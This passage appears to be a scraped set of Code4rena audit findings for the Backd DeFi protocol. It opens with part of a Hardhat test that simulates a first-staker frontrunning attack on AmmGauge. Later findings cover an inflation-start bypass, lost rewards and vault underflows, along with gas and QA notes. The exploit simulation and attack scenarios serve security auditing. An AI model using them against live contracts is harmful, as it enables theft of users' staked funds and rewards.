this.ammgauge.totalStaked()                 console.log(\"  \")                 console.log(\"         ALICE / BOB\");                 console.log(`Shares: ${userShares}`);                 console.log(`Integr: ${userIntegral}`);                 console.log(`Balanc: ${userBalance}`);                 console.log(\"  \")                 console.log(\"Global\")                 console.log(`Integral: ${ethers.utils.formatEther(globalIntegral)}, TotalStaked: ${ethers.utils.formatEther(totalStaked)}`)             }              const stake = async (to, amount) => {                 await updateStates()                 console.log(\" \")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).stake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));                 // await updateStates();                 console.log(\" \")             }              const unstake = async (to, amount) => {                 await updateStates()                 console.log(\" \")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).unstake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));                 await updateStates();                 console.log(\" \")             }              // HERE IS WHERE THE SIMULATION IS PERFORMED             let simulationTimes = 2;             let withOneWeiDeposit = true;              if (withOneWeiDeposit) {                 // Alice deposits first                 console.log(\"Alice Deposits 1wei\")                 let firstUserDeposit = ethers.utils.parseEther(\"1\");                 await stake(alice, 1);             }              for (let index = 1; index <= simulationTimes; index++) {                 console.log(\" \")                 console.log(`Loop number ${index}`);                 console.log(\" \")                  console.log(\"A day passes until Bob decides to deposit\")                 await ethers.provider.send(\"evm_increaseTime\", [1 * 24 * 60 * 60]); // 1 days                  console.log(\" \")                 console.log(\"She scans that Bob is about to stake 10. So decides to frontrun him.\")                 console.log(\"Alice Frontruns\")                 let frontrunAmount = ethers.utils.parseEther(\"10\");                 await stake(alice, frontrunAmount);                  console.log(\" \")                 console.log(\"Bob stakes 10 tokens\")                 await stake(bob, frontrunAmount)                  // A few days pass                 await ethers.provider.send(\"evm_increaseTime\", [1 * 24 * 60 * 60]); // 2 days                 // The pool is checkpointed                 await this.ammgauge.poolCheckpoint();                 console.log(\"After 1 day the pool is checkpointed\")                 await updateStates()              }         })  The simulation was both made for the attacked and non attacked situations. The values that are shown represent how the contract updates them (the `totalStaked` variable is 0 when first Alice calls the stake function after `_userCheckpoint()` rans)  ### WITH 1WEI STAKE (ATTACK)   | time |                Situation               |  totalStaked  | Alice Shares | Bob Shares | |:----:|:--------------------------------------:|:-------------:|:------------:|:----------:| |  0-  |          First poolCheckpoint          |       0       |       0      |      0     | |  0+  |           Alice Deposits 1wei          |       0       |       0      |      0     | |   1  |       Alice frontruns Bob @ 10eth      |      1wei     |       0      |      0     | |   2  |         Bob 10eth txn is mined         |  10eth + 1wei |     86.4     |      0     | |   3  | 1 day later poolCheckpoint() is called | 20eth + 1 wei |     86.4     |      0     | |   4  |        Alice frontruns Bob again       | 20eth + 1 wei |     86.4     |      0     | |   5  |         Bob 10eth txn is mined         |  30eth + 1wei |     172.8    |      0     | |   6  | 1 day later poolCheckpoint() is called |  40eth + 1wei |     172.8    |    86.4    |  ### WITHOUT THE 1WEI STAKE (No \"first staker hijack\")  | time |                Situation               | totalStaked | Alice Shares | Bob Shares | |:----:|:--------------------------------------:|:-----------:|:------------:|:----------:| |  0-  |          First poolCheckpoint          |      0      |       0      |      0     | |  0+  |           Alice stakes 10eth           |      0      |       0      |      0     | |   1  |            Bob stakes 10eth            |    10eth    |       0      |      0     | |   2  | 1 day later poolCheckpoint() is called |    20eth    |       0      |      0     | |   3  |           Alice stakes 10eth           |    20eth    |       0      |      0     | |   4  |            Bob stakes 10eth            |    30eth    |     86.4     |      0     | |   5  | 1 day later poolCheckpoint() is called |    40eth    |     86.4     |    86.4    |   ## Recommended Mitigation Steps Further evaluation on how the variables are updated and how does the `Integral` (both each users and global one) is calculated on the pool inception is needed to patch this issue.  "}, {"title": "`Minter.sol#startInflation()` can be bypassed", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/99", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108   # Vulnerability details  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108  ```solidity     function startInflation() external override onlyGovernance {         require(lastEvent == 0, \"Inflation has already started.\");         lastEvent = block.timestamp;         lastInflationDecay = block.timestamp;     } ```  As `lastEvent` and `lastInflationDecay` are not initialized in the `constructor()`, they will remain to the default value of `0`.  However, the permissionless `executeInflationRateUpdate()` method does not check the value of `lastEvent` and `lastInflationDecay` and used them directly.  As a result, if `executeInflationRateUpdate()` is called before `startInflation()`:  1. L190, the check of if `_INFLATION_DECAY_PERIOD` has passed since `lastInflationDecay` will be `true`, and `initialPeriodEnded` will be set to `true` right away; 2. L188, since the `lastEvent` in `totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));` is `0`, the `totalAvailableToNow` will be set to `totalAvailableToNow \u2248 currentTotalInflation * 52 years`, which renders the constrains of `totalAvailableToNow` incorrect and useless.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L115-L117  ```solidity     function executeInflationRateUpdate() external override returns (bool) {         return _executeInflationRateUpdate();     } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215  ```solidity     function _executeInflationRateUpdate() internal returns (bool) {         totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));         lastEvent = block.timestamp;         if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {             currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);             if (initialPeriodEnded) {                 currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                     annualInflationDecayKeeper                 );                 currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                     annualInflationDecayAmm                 );             } else {                 currentInflationAmountKeeper =                     initialAnnualInflationRateKeeper /                     _INFLATION_DECAY_PERIOD;                  currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;                 initialPeriodEnded = true;             }             currentTotalInflation =                 currentInflationAmountLp +                 currentInflationAmountKeeper +                 currentInflationAmountAmm;             controller.inflationManager().checkpointAllGauges();             lastInflationDecay = block.timestamp;         }         return true;     } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L50-L51  ```solidity     // Used for final safety check to ensure inflation is not exceeded     uint256 public totalAvailableToNow; ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L217-L227  ```solidity     function _mint(address beneficiary, uint256 amount) internal returns (bool) {         totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation);         uint256 newTotalMintedToNow = totalMintedToNow + amount;         require(newTotalMintedToNow <= totalAvailableToNow, \"Mintable amount exceeded\");         totalMintedToNow = newTotalMintedToNow;         lastEvent = block.timestamp;         token.mint(beneficiary, amount);         _executeInflationRateUpdate();         emit TokensMinted(beneficiary, amount);         return true;     } ```  ### Recommendation   Consider initializing `lastEvent`, `lastInflationDecay` in `constructor()`.  or  Consider adding `require(lastEvent != 0 && lastInflationDecay != 0, \"...\")` to `executeInflationRateUpdate()`.  "}, {"title": "`Minter.sol#_executeInflationRateUpdate()` `inflationManager().checkpointAllGauges()` is called after InflationRate is updated, causing users to lose rewards", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215   # Vulnerability details  When `Minter.sol#_executeInflationRateUpdate()` is called, if an `_INFLATION_DECAY_PERIOD` has past since `lastInflationDecay`, it will update the InflationRate for all of the gauges.  However, in the current implementation, the rates will be updated first, followed by the rewards being settled using the new rates on the gauges using `inflationManager().checkpointAllGauges()`.  If the `_INFLATION_DECAY_PERIOD` has passed for a long time before `Minter.sol#executeInflationRateUpdate()` is called, the users may lose a significant amount of rewards.  On a side note, `totalAvailableToNow` is updated correctly.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215  ```solidity function _executeInflationRateUpdate() internal returns (bool) {     totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));     lastEvent = block.timestamp;     if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {         currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);         if (initialPeriodEnded) {             currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                 annualInflationDecayKeeper             );             currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                 annualInflationDecayAmm             );         } else {             currentInflationAmountKeeper =                 initialAnnualInflationRateKeeper /                 _INFLATION_DECAY_PERIOD;              currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;             initialPeriodEnded = true;         }         currentTotalInflation =             currentInflationAmountLp +             currentInflationAmountKeeper +             currentInflationAmountAmm;         controller.inflationManager().checkpointAllGauges();         lastInflationDecay = block.timestamp;     }     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L110-L125  ```solidity function checkpointAllGauges() external override returns (bool) {     uint256 length = _keeperGauges.length();     for (uint256 i; i < length; i = i.uncheckedInc()) {         IKeeperGauge(_keeperGauges.valueAt(i)).poolCheckpoint();     }     address[] memory stakerVaults = addressProvider.allStakerVaults();     for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {         IStakerVault(stakerVaults[i]).poolCheckpoint();     }      length = _ammGauges.length();     for (uint256 i; i < length; i = i.uncheckedInc()) {         IAmmGauge(_ammGauges.valueAt(i)).poolCheckpoint();     }     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L110-L117  ```solidity function poolCheckpoint() public override returns (bool) {     if (killed) return false;     uint256 timeElapsed = block.timestamp - uint256(lastUpdated);     uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);     perPeriodTotalInflation[epoch] += currentRate * timeElapsed;     lastUpdated = uint48(block.timestamp);     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L507-L519  ```solidity function getKeeperRateForPool(address pool) external view override returns (uint256) {     if (minter == address(0)) {         return 0;     }     uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();     // After deactivation of weight based dist, KeeperGauge handles the splitting     if (weightBasedKeeperDistributionDeactivated) return keeperInflationRate;     if (totalKeeperPoolWeight == 0) return 0;     bytes32 key = _getKeeperGaugeKey(pool);     uint256 poolInflationRate = (currentUInts256[key] * keeperInflationRate) /         totalKeeperPoolWeight;     return poolInflationRate; } ```   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L173-L176  ```solidity     function getKeeperInflationRate() external view override returns (uint256) {         if (lastEvent == 0) return 0;         return currentInflationAmountKeeper;     } ```  ### PoC  Given:  - currentInflationAmountAmm: 12,000 Bkd (1000 per month) - annualInflationDecayAmm: 50% - initialPeriodEnded: true - lastInflationDecay: 11 months ago - _INFLATION_DECAY_PERIOD: 1 year  1. Alice deposited as the one and only staker in the `AmmGauge` pool; 2. 1 month later; 3. `Minter.sol#_executeInflationRateUpdate()` is called; 4. Alice `claimableRewards()` and received `500` Bkd tokens.  Expected Results:  - Alice to receive `1000` Bkd tokens as rewards.  Actual Results:  - Alice received `500` Bkd tokens as rewards.  ### Recommendation  Consider moving the call to `checkpointAllGauges()` to before the `currentInflationAmountKeeper` is updated.  ```solidity function _executeInflationRateUpdate() internal returns (bool) {     totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));     lastEvent = block.timestamp;     if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {         controller.inflationManager().checkpointAllGauges();         currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);         if (initialPeriodEnded) {             currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                 annualInflationDecayKeeper             );             currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                 annualInflationDecayAmm             );         } else {             currentInflationAmountKeeper =                 initialAnnualInflationRateKeeper /                 _INFLATION_DECAY_PERIOD;              currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;             initialPeriodEnded = true;         }         currentTotalInflation =             currentInflationAmountLp +             currentInflationAmountKeeper +             currentInflationAmountAmm;         lastInflationDecay = block.timestamp;     }     return true; } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/94", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# QA  ## Use unchecked lib  ### `PoolMigrationZap.sol`  #### Enforce pattern on loops You can add the unchecked math lib like you do on the others contracts to safely increment the `i` var, saving gas and make contract consistent with the others by enforcing the same style.  On [`PoolMigrationZap.sol#L39-L44`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L39-L44) you are doing a unchecked increment in the loop, but in the rest of the code you a different pattern. Add the unchecked math lib and change: ```solidity         for (uint256 i; i < oldPoolAddresses_.length; ) {             migrate(oldPoolAddresses_[i]);             unchecked {                 ++i;             }         } ``` To; ```solidity         for (uint256 i; i < oldPoolAddresses_.length; i = i.uncheckedInc()) {             migrate(oldPoolAddresses_[i]);         } ```  #### `_underlyingNewPools` can end with a wrong data  If `underlying_` is `address(0)` then `_underlyingNewPools[address(0)]` will be fill...  Consider change lines [`PoolMigrationZap.sol#L26-L27`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L26-L27) from: ```solidity             _underlyingNewPools[underlying_] = newPool_;             if (underlying_ == address(0)) continue; ``` To: ```solidity             if (underlying_ == address(0)) continue;             _underlyingNewPools[underlying_] = newPool_; ```  ## `ConvexStrategyBase.sol`  ### Change var name to avoid shadow  On line [L287](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/strategies/ConvexStrategyBase.sol#L287) you are declaring variable with the same name, i understang that is for caching, but i recommend to change the variable name, consider changing this; ```solidity         address _swapperRouter = address(_swapperRouter);         IERC20(token_).safeApprove(_swapperRouter, 0);         IERC20(token_).safeApprove(_swapperRouter, type(uint256).max); ``` To this; ```solidity         address swapperRouter_ = address(_swapperRouter);         IERC20(token_).safeApprove(swapperRouter_, 0);         IERC20(token_).safeApprove(swapperRouter_, type(uint256).max); ```  ## `LiquidityPool.sol`  ### Add check before calling `safeApprove`  In think you will need a check before doing the safeApprove call on [LiquidityPool.sol#L700](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/pool/LiquidityPool.sol#L700) Just replace; ```solidity  IERC20(lpToken_).safeApprove(staker_, type(uint256).max); ``` With  ```solidity if (IERC20(lpToken_).allowance(staker_, spender) > 0) return; IERC20(lpToken_).safeApprove(staker_, type(uint256).max); ```  _keeperGauge  ## Missing event emission  Critical function dont emit events; [`InflationManager.sol#L58-L63:setMinter`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L58-L63) [InflationManager.sol#L89:deactivateWeightBasedKeeperDistribution](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L89)  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/93", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Gas optimizations   ## Use unchecked lib to increment safe variables  ### `PoolMigrationZap.sol`  You can add the unchecked math lib like you do on the others contracts to safely increment the `i` var, saving gas and make contract consistent with the others by enforcing the same style.  Recommendation, add `using UncheckedMath for uint256` And on line [`PoolMigrationZap.sol#L22`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L22) change; ```solidity for (uint256 i; i < newPools_.length; ++i) { ``` To ```solidity for (uint256 i; i < newPools_.length; i = i.uncheckedInc()) { ```  ### `TopUpKeeperHelper.sol`  On line [TopUpKeeperHelper.sol#L52](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/actions/topup/TopUpKeeperHelper.sol#L52) you coul use unchecked math lib to increment the variable. Change: ```solidity topupsAdded++; ``` To: ```solidity topupsAdded = topupsAdded.uncheckedInc(); ```  ### `KeeperGauge.sol`  On lines [#L98](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L98) and [L59](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L59) you could use unchecked math lib, consider change;  ```solidity epoch++; ``` To; ```solidity epoch = epoch.uncheckedInc(); ```  ### Use unchecked for decrement `i` On [BkdLocker.sol#L140](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140) you can do a unchecked decrement (or add a function to the Unchecked math to do it) change; ```solidity i = i - 1; ``` to; ```solidity unchecked { --i; } ```  ### Cache `.length`  You could cache lenght of arrays to save gas; [`RewardHandler.sol#L41-L42`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L41-L42) [`StakerVault.sol#L259`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L259) [`VestedEscrow.sol#L94`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L94)   ### Use `require(foo != 0)` instead of `require(foo > 0)`  `>0` is less gas efficient than `!0` if you enable the optimizer at 10k AND you\u2019re in a require statement.  [`BkdLocker.sol#L91`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L91) [`BkdLocker.sol#L92`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L92) [`BkdLocker.sol#L137`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L137) [`VestedEscrow.sol#L84`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L84) [`KeeperGauge.sol#L140`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140) [`AmmGauge.sol#L104`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104) [`AmmGauge.sol#L125`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L125) "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/91", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": " ## > 0 is less efficient than != 0 for unsigned integers (with proof)  `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)  Proof: While it may seem that `> 0` is cheaper than `!=`,  this is only true without the optimizer enabled and outside a require  statement. If you enable the optimizer at 10k AND you\u2019re in a `require` statement, this will save gas. You can see this tweet for more proofs: [https://twitter.com/gzeon/status/1485428085885640706](https://twitter.com/gzeon/status/1485428085885640706)  I suggest changing `> 0` with `!= 0` here:  ### Instances: contracts/BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); contracts/BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); contracts/BkdLocker.sol:137:        require(length > 0, \"No entries\"); contracts/pool/LiquidityPool.sol:469:        require(underlyingAmount > 0, Error.INVALID_AMOUNT); contracts/pool/LiquidityPool.sol:471:        require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE); contracts/pool/LiquidityPool.sol:514:        require(mintedLp >= minTokenAmount && mintedLp > 0, Error.INVALID_AMOUNT); contracts/pool/LiquidityPool.sol:538:        require(redeemLpTokens > 0, Error.INVALID_AMOUNT); contracts/testing/MockVotingEscrow.sol:35:        require(_balances[msg.sender] > 0, \"a lock needs to first be created\"); contracts/testing/MockErc20Strategy.sol:64:        require(currentBalance > 0, \"Invalid amount to withdraw\"); contracts/testing/MockErc20Strategy.sol:74:        require(amount > 0, \"Invalid amount to transfer\"); contracts/testing/MockEthStrategy.sol:65:        require(currentBalance > 0, \"Invalid amount to withdraw\"); contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, \"No reward tokens in contract\"); contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); contracts/vault/Vault.sol:163:        require(amount > 0, Error.INVALID_AMOUNT); contracts/actions/topup/TopUpActionFeeHandler.sol:123:        require(totalClaimable > 0, Error.NOTHING_TO_CLAIM); contracts/actions/topup/TopUpAction.sol:214:        require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT); contracts/actions/topup/TopUpAction.sol:535:        require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);  Also, please enable the Optimizer."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/90", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1. Don't change storage variable needlessly contracts\\BkdLocker.sol#L144 Currently it replaces stashedWithdraws[i] even if \"i\" equals to \"stashedWithdraws.length - 1\". And it calculates stashedWithdraws.length every time after pop right, you can reduce gas by changing the length variable. You can replace L144 like below.  --length; if(i != length) { \u00a0 \u00a0 stashedWithdraws[i] = stashedWithdraws[length]; }   2. Needless conditions. contracts\\tokenomics\\InflationManager.sol#L575 contracts\\tokenomics\\InflationManager.sol#L589 contracts\\tokenomics\\InflationManager.sol#L602  From the logic of the contract, \"totalKeeperPoolWeight\" will be always non-negative. Even if this value could be negative, it will be revoked with underflow error before.   3. Use != 0 instead of > 0 for uint variables contracts\\BkdLocker.sol#L91 contracts\\BkdLocker.sol#L92 contracts\\BkdLocker.sol#L137 contracts\\BkdLocker.sol#L139 contracts\\BkdLocker.sol#L254 contracts\\BkdLocker.sol#L301 contracts\\tokenomics\\AmmGauge.sol#L88 contracts\\tokenomics\\AmmGauge.sol#L104 contracts\\tokenomics\\AmmGauge.sol#L125 contracts\\tokenomics\\AmmGauge.sol#L147 contracts\\tokenomics\\FeeBurner.sol#L117 contracts\\tokenomics\\KeeperGauge.sol#L140 contracts\\tokenomics\\LpGauge.sol#L68 contracts\\tokenomics\\LpGauge.sol#L114 contracts\\tokenomics\\VestedEscrow.sol#L84 contracts\\RewardHandler.sol#L63  4. Change storage to memory if possible contracts\\BkdLocker.sol#L251   5. An array\u2019s length should be cached to save gas in for-loops contracts\\StakerVault.sol#L259 contracts\\tokenomics\\FeeBurner.sol#L56 contracts\\tokenomics\\InflationManager.sol#L116 contracts\\tokenomics\\VestedEscrow.sol#L94 contracts\\zaps\\PoolMigrationZap.sol#L22 contracts\\zaps\\PoolMigrationZap.sol#L39   6. Usage of unchecked can reduce the gas cost contracts\\StakerVault.sol#L387  _allowances[src][msg.sender] = allowance_.uncheckedSub(unstaked);"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/89", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Summary It was easy to understand the logic for me because the codes have detailed explanations. I recommended adding some more require() for better performance.  ## Low Risk Issues 1. Add additional require() for better performance.  i) contracts\\BkdLocker.sol#L49 require(_govToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); require(_rewardToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  ii) contracts\\BkdLocker.sol#L60 \"maxBoost\" must be greater than \"startBoost\", otherwise L276-L278 will be revoked. require(maxBoost >= startBoost, Error.INVALID_AMOUNT);  iii) contracts\\BkdLocker.sol#L60 \"increasePeriod\" must be positive, otherwise L276-L278 will be revoked. require(increasePeriod != 0, Error.INVALID_AMOUNT);  iv) contracts\\BkdLocker.sol#L123 \"amount\" must be positive, otherwise the user can prepare unlock endlessly. require(amount != 0, Error.INVALID_AMOUNT);  v) contracts\\BkdLocker.sol#L215 require(claimable != 0, Error.INVALID_AMOUNT);  vi) contracts\\tokenomics\\VestedEscrow.sol#L60 In this setFundAdmin() function at L75, it checks the first require() already. require(fundadmin_ != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); require(rewardToken_ != address(0), , Error.ZERO_ADDRESS_NOT_ALLOWED);   2. Wrong comment contracts\\BkdLocker.sol#L87  There are no \"deposit\" or \"depositFor\" functions in this contract. You need to write \"lock\" or \"lockFor\" instead.   3. executeKeeperPoolWeight() and batchExecuteKeeperPoolWeights() functions in InflationManager.sol must have some role restrictions. There are 2 other functions. executeLpPoolWeight(), executeAmmTokenWeight().  contracts\\tokenomics\\InflationManager.sol#L151 contracts\\tokenomics\\InflationManager.sol#L241 contracts\\tokenomics\\InflationManager.sol#L326  With the above functions, the batch functions have the modifier \"onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)\". I think the above functions should have the same modifier also.   4. claim() function in VestedEscrow.sol should have nonReentrant modifier same as other claim() function at L138.  contracts\\tokenomics\\VestedEscrow.sol#L113-L115  Otherwise, you can change the function like this(same as VestedEscrowRevocable.sol).  function claim() external virtual override {  \u00a0 \u00a0 claim(msg.sener); }"}, {"title": "StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked.", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/87", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L98-L102 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L342-L346 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L391-L395   # Vulnerability details  ## Impact StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked.  ## Proof of Concept Currently it saves totalStaked for strategies and non-strategies separately. uint underflow error could be occured in these cases.  Scenario 1. 1. Address A(non-strategy) stakes some amount x and it will be added to StakerVault_poolTotalStaked. 2. This address A is approved as a strategy by StakerVault.inflationManager. 3. Address A tries to unstake amount x, it will be deducted from StakerVault.strategiesTotalStaked because this address is a strategy already. Even if it would succeed for this strategy but it will revert for other strategies because StakerVault.strategiesTotalStaked is less than correct staked amount for strategies.  Scenario 2. There is a transfer between strategy and non-strategy using StakerVault.transfer(), StakerVault.transferFrom() functions. In this case, StakerVault.strategiesTotalStaked and StakerVault._poolTotalStaked must be changed accordingly but there is no such logic.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().  1. You need to move staked amount from StakerVault._poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy. You can modify addStrategy() at L98-L102 like this.  function addStrategy(address strategy) external override returns (bool) {     require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);     require(!strategies[strategy], Error.ADDRESS_ALREADY_SET);      strategies[strategy] = true;     _poolTotalStaked -= balances[strategy];     strategiesTotalStaked += balances[strategy];      return true; }  2. You need to add below code at L126 of transfer() function.  if(strategies[msg.sender] != strategies[account]) {     if(strategies[msg.sender]) { // from strategy to non-strategy         